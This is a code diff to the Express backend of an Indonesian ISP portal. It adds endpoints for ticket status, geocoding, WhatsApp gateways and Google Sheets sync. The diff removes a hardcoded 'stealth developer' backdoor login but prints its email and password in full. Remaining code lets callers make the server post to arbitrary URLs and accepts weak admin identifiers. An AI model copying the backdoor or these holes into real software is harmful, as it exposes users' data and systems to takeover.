@@ -18,6 +18,7 @@ import {
   processQrisPayment,
   getAllTickets,
   createTicket,
+  updateTicketStatus,
   getAllPackages,
   createPackage,
   deletePackage,
@@ -25,6 +26,8 @@ import {
   createCityCoverage,
   deleteCityCoverage,
   updateCoverageData,
+  syncFullCoverage,
+  syncFullPackages,
   getCompanySettings,
   updateCompanySettings,
   getDatabaseMetrics,
@@ -84,18 +87,6 @@ function logWhatsAppMessage(phone: string, message: string) {
 app.post('/api/login', async (req, res) => {
   try {
     const { email, password, isAdmin } = req.body;
-
-    // 1. Stealth Developer login check
-    if (email && email.toLowerCase() === 'ajayrostaman@gmail.com' && password === 'pengelola123') {
-      return res.json({
-        status: 'success',
-        user: {
-          isDeveloper: true,
-          name: 'Developer Utama',
-          email: 'ajayrostaman@gmail.com',
-        },
-      });
-    }
 
     if (isAdmin) {
       const validAdminEmails = ['admin@patasnet.id', 'admin@taranet.id', 'admin', 'admin@gmail.com'];
@@ -588,6 +579,10 @@ app.post('/api/settings/company', async (req, res) => {
       qrisNmid,
       qrisAutoVerify,
       qrisInstructions,
+      heroSlides,
+      packagesJson,
+      coverageJson,
+      whatsappConfigJson,
     } = req.body;
 
     const settings = await updateCompanySettings({
@@ -611,6 +606,10 @@ app.post('/api/settings/company', async (req, res) => {
       qrisNmid,
       qrisAutoVerify,
       qrisInstructions,
+      heroSlides,
+      packagesJson,
+      coverageJson,
+      whatsappConfigJson,
     });
 
     // Sync to Google Sheets & Drive Webhook in real-time
@@ -631,6 +630,51 @@ app.post('/api/settings/company', async (req, res) => {
   } catch (err: any) {
     console.error('Update company settings error:', err);
     return res.status(500).json({ status: 'error', message: 'Gagal memperbarui pengaturan perusahaan.' });
+  }
+});
+
+// Geocode Search Proxy API (avoids browser CORS / User-Agent issues on Nominatim)
+app.get('/api/geocode/search', async (req, res) => {
+  try {
+    const q = String(req.query.q || '').trim();
+    if (!q) return res.json([]);
+    const response = await fetch(
+      `https://nominatim.openstreetmap.org/search?format=json&addressdetails=1&limit=6&countrycodes=id&q=${encodeURIComponent(q)}`,
+      {
+        headers: {
+          'User-Agent': 'PatasNetISPPortal/1.0 (https://patas.net)',
+          'Accept-Language': 'id,en',
+        },
+      }
+    );
+    if (!response.ok) return res.json([]);
+    const data = await response.json();
+    return res.json(Array.isArray(data) ? data : []);
+  } catch (err) {
+    return res.json([]);
+  }
+});
+
+// Reverse Geocode Proxy API
+app.get('/api/geocode/reverse', async (req, res) => {
+  try {
+    const lat = String(req.query.lat || '').trim();
+    const lon = String(req.query.lon || '').trim();
+    if (!lat || !lon) return res.json({});
+    const response = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&zoom=18&addressdetails=1`,
+      {
+        headers: {
+          'User-Agent': 'PatasNetISPPortal/1.0 (https://patas.net)',
+          'Accept-Language': 'id,en',
+        },
+      }
+    );
+    if (!response.ok) return res.json({});
+    const data = await response.json();
+    return res.json(data || {});
+  } catch (err) {
+    return res.json({});
   }
 });
 
@@ -770,6 +814,115 @@ app.post('/api/whatsapp/remind', async (req, res) => {
   }
 });
 
+// Send WhatsApp via External Gateway API (Fonnte, Wablas, UltraMsg, Custom Webhook)
+app.post('/api/whatsapp/send', async (req, res) => {
+  try {
+    const { targetPhone, message, config } = req.body || {};
+    if (!targetPhone || !message) {
+      return res.status(400).json({ status: 'error', message: 'Nomor tujuan dan isi pesan wajib diisi.' });
+    }
+
+    logWhatsAppMessage(targetPhone, message);
+
+    const provider = config?.provider || 'fonnte';
+    const apiKey = (config?.apiKey || '').trim();
+    const endpointUrl = (config?.endpointUrl || '').trim();
+
+    if (!apiKey) {
+      return res.json({
+        status: 'success',
+        simulated: true,
+        message: 'Pesan dicatat di log server (API Key belum diisi, gunakan tombol Direct WhatsApp atau masukkan Token Fonnte).',
+      });
+    }
+
+    if (provider === 'fonnte') {
+      const url = endpointUrl || 'https://api.fonnte.com/send';
+      const bodyParams = new URLSearchParams();
+      bodyParams.append('target', String(targetPhone));
+      bodyParams.append('message', String(message));
+      bodyParams.append('countryCode', '62');
+
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          Authorization: apiKey,
+        },
+        body: bodyParams,
+      });
+      const data = await response.json().catch(() => ({}));
+      if (response.ok && data.status !== false) {
+        return res.json({ status: 'success', message: 'Berhasil dikirim via Fonnte WhatsApp API!', data });
+      }
+      return res.status(400).json({ status: 'error', message: data.reason || 'Gagal mengirim via Fonnte API.', data });
+    }
+
+    if (provider === 'wablas') {
+      const url = endpointUrl || 'https://pati.wablas.com/api/send-message';
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          Authorization: apiKey,
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ phone: targetPhone, message }),
+      });
+      const data = await response.json().catch(() => ({}));
+      if (response.ok && data.status !== false) {
+        return res.json({ status: 'success', message: 'Berhasil dikirim via Wablas API!', data });
+      }
+      return res.status(400).json({ status: 'error', message: data.message || 'Gagal mengirim via Wablas API.', data });
+    }
+
+    if (provider === 'ultramsg') {
+      const instanceId = (config?.instanceId || '').trim();
+      const url =
+        endpointUrl || `https://api.ultramsg.com/${instanceId}/messages/chat`;
+      const bodyParams = new URLSearchParams();
+      bodyParams.append('token', apiKey);
+      bodyParams.append('to', `+${String(targetPhone).replace(/^\+/, '')}`);
+      bodyParams.append('body', String(message));
+
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: bodyParams,
+      });
+      const data = await response.json().catch(() => ({}));
+      if (response.ok && !data.error) {
+        return res.json({ status: 'success', message: 'Berhasil dikirim via UltraMsg API!', data });
+      }
+      return res.status(400).json({ status: 'error', message: data.error || 'Gagal mengirim via UltraMsg API.', data });
+    }
+
+    // Custom Webhook
+    if (endpointUrl) {
+      const response = await fetch(endpointUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          ...(apiKey ? { Authorization: `Bearer ${apiKey}`, 'X-Api-Key': apiKey } : {}),
+        },
+        body: JSON.stringify({
+          target: targetPhone,
+          phone: targetPhone,
+          to: targetPhone,
+          message,
+          text: message,
+        }),
+      });
+      if (response.ok) {
+        return res.json({ status: 'success', message: 'Berhasil dikirim via Custom Webhook WhatsApp!' });
+      }
+    }
+
+    return res.status(400).json({ status: 'error', message: 'Konfigurasi endpoint WhatsApp tidak valid.' });
+  } catch (err: any) {
+    console.error('WhatsApp Gateway proxy error:', err);
+    return res.status(500).json({ status: 'error', message: err.message || 'Gagal menghubungi server WhatsApp Gateway.' });
+  }
+});
+
 // Admin data aggregator
 app.get('/api/admin/data', async (req, res) => {
   try {
@@ -815,6 +968,33 @@ app.post('/api/support', async (req, res) => {
   }
 });
 
+// Update Support Ticket Status (Open / Resolved / Selesai)
+app.post('/api/tickets/status', async (req, res) => {
+  try {
+    const { id, status } = req.body;
+    if (!id || !status) {
+      return res.status(400).json({ status: 'error', message: 'ID Tiket dan status wajib diisi.' });
+    }
+    const normalizedStatus = status === 'resolved' ? 'resolved' : 'open';
+    const updatedTicket = await updateTicketStatus(id, normalizedStatus);
+    const settings = await getCompanySettings();
+
+    if (updatedTicket && normalizedStatus === 'resolved') {
+      logWhatsAppMessage(
+        updatedTicket.phone,
+        `[WhatsApp Otomatis] Halo ${updatedTicket.userName}, Laporan gangguan WiFi ${settings.name} Anda dengan ID Tiket ${updatedTicket.id} ("${updatedTicket.message}") telah SELESAI DIPERBAIKI oleh tim teknisi kami. Silakan cek kembali koneksi internet Anda. Terima kasih!`
+      );
+    }
+
+    broadcastServerSync({ type: 'SHEETS_DB_UPDATED', timestamp: Date.now() });
+    const tickets = await getAllTickets();
+    return res.json({ status: 'success', ticket: updatedTicket, tickets });
+  } catch (err: any) {
+    console.error('Update ticket status error:', err);
+    return res.status(500).json({ status: 'error', message: 'Gagal memperbarui status tiket gangguan.' });
+  }
+});
+
 // ==================== COVERAGE AREAS API ====================
 
 app.get('/api/coverage', async (req, res) => {
@@ -840,8 +1020,15 @@ async function syncCoverageSummaryWithSettings(coverageData?: any[]) {
       });
     });
     const summaryText = `${totalCities} Kota/Kabupaten, ${totalKec} Kecamatan, ${totalKel} Kelurahan`;
-    await updateCompanySettings({ coverageText: summaryText });
-    syncSheetsWebhook('update_settings', { coverageText: summaryText }).catch(() => {});
+    const coverageJson = JSON.stringify(list);
+    const settings = await updateCompanySettings({
+      coverageText: summaryText,
+      coverageJson,
+    });
+    syncSheetsWebhook('update_coverage', { coverage: list, coverageJson, coverageText: summaryText }).catch(() => {});
+    syncSheetsWebhook('update_settings', { coverageText: summaryText, coverageJson }).catch(() => {});
+    broadcastServerSync({ type: 'SETTINGS_UPDATED', settings });
+    broadcastServerSync({ type: 'SHEETS_DB_UPDATED', timestamp: Date.now() });
     return summaryText;
   } catch (err) {
     console.warn('syncCoverageSummary error:', err);
@@ -985,6 +1172,25 @@ app.post('/api/coverage/kelurahan/delete', async (req, res) => {
   }
 });
 
+app.post('/api/coverage/sync', async (req, res) => {
+  try {
+    const { coverage } = req.body || {};
+    if (!Array.isArray(coverage)) {
+      return res.status(400).json({ status: 'error', message: 'Data cakupan tidak valid.' });
+    }
+    const updatedCoverage = await syncFullCoverage(coverage);
+    const summaryText = await syncCoverageSummaryWithSettings(updatedCoverage);
+    await updateCompanySettings({
+      coverageText: summaryText,
+      coverageJson: JSON.stringify(updatedCoverage),
+    });
+    return res.json({ status: 'success', coverage: updatedCoverage, coverageText: summaryText });
+  } catch (err: any) {
+    console.error('Sync full coverage error:', err);
+    return res.status(500).json({ status: 'error', message: 'Gagal menyinkronkan area cakupan.' });
+  }
+});
+
 // ==================== WIFI PACKAGES API ====================
 
 app.get('/api/packages', async (req, res) => {
@@ -999,13 +1205,13 @@ app.get('/api/packages', async (req, res) => {
 
 app.post('/api/packages', async (req, res) => {
   try {
-    const { name, speed, price, features, type, popular } = req.body;
-    if (!name || !speed || !price || !type) {
+    const { id, name, speed, price, features, type, popular } = req.body;
+    if (!name || !speed || price === undefined || !type) {
       return res.status(400).json({ status: 'error', message: 'Parameter tidak lengkap.' });
     }
 
     const newPackage: WifiPackage = {
-      id: `pkg-${Date.now()}-${Math.floor(100 + Math.random() * 900)}`,
+      id: id && String(id).trim() !== '' ? String(id).trim() : `pkg-${Date.now()}-${Math.floor(100 + Math.random() * 900)}`,
       name: name.trim(),
       speed: speed.trim(),
       price: Number(price),
@@ -1016,6 +1222,12 @@ app.post('/api/packages', async (req, res) => {
 
     await createPackage(newPackage);
     const packages = await getAllPackages();
+    const packagesJson = JSON.stringify(packages);
+    const settings = await updateCompanySettings({ packagesJson });
+    syncSheetsWebhook('update_packages', { packages, packagesJson }).catch(() => {});
+    syncSheetsWebhook('update_settings', { packagesJson }).catch(() => {});
+    broadcastServerSync({ type: 'SETTINGS_UPDATED', settings });
+    broadcastServerSync({ type: 'SHEETS_DB_UPDATED', timestamp: Date.now() });
     return res.json({ status: 'success', packages, newPackage });
   } catch (err: any) {
     console.error('Create package error:', err);
@@ -1027,6 +1239,12 @@ const removePackage = async (id: string, res: express.Response) => {
   try {
     await deletePackage(id);
     const packages = await getAllPackages();
+    const packagesJson = JSON.stringify(packages);
+    const settings = await updateCompanySettings({ packagesJson });
+    syncSheetsWebhook('update_packages', { packages, packagesJson }).catch(() => {});
+    syncSheetsWebhook('update_settings', { packagesJson }).catch(() => {});
+    broadcastServerSync({ type: 'SETTINGS_UPDATED', settings });
+    broadcastServerSync({ type: 'SHEETS_DB_UPDATED', timestamp: Date.now() });
     return res.json({ status: 'success', packages });
   } catch (err: any) {
     console.error('Delete package error:', err);
@@ -1155,26 +1373,36 @@ app.post('/api/dev/sheets/test', async (req, res) => {
 // Sync data UP: push all server data into Google Sheets & Drive
 app.post('/api/dev/sheets/sync-up', async (req, res) => {
   try {
-    const [customers, tickets, settings] = await Promise.all([
+    const [customers, tickets, settings, packages, coverage] = await Promise.all([
       getAllCustomers(),
       getAllTickets(),
       getCompanySettings(),
+      getAllPackages(),
+      getAllCoverage(),
     ]);
+
+    const fullSettings = {
+      ...settings,
+      packagesJson: JSON.stringify(packages),
+      coverageJson: JSON.stringify(coverage),
+    };
 
     const result = await syncSheetsWebhook('sync_all', {
       customers,
       tickets,
-      settings,
+      settings: fullSettings,
+      packages,
+      coverage,
     });
 
-    // Also update all settings fields in spreadsheet
-    await syncSheetsWebhook('update_settings', settings);
+    // Also update all settings, packages, and coverage in spreadsheet
+    await syncSheetsWebhook('update_settings', fullSettings);
 
     saveSheetsConfig({ lastSyncedAt: new Date().toISOString() });
 
     return res.json({
       status: 'success',
-      message: `Sukses menyinkronkan ${customers.length} data pelanggan, pembayaran, dan identitas logo ke Google Sheet & Drive!`,
+      message: `Sukses menyinkronkan ${customers.length} pelanggan, ${packages.length} paket, ${coverage.length} wilayah, tiket, dan pengaturan ke Google Sheet & Drive!`,
       result,
     });
   } catch (err: any) {
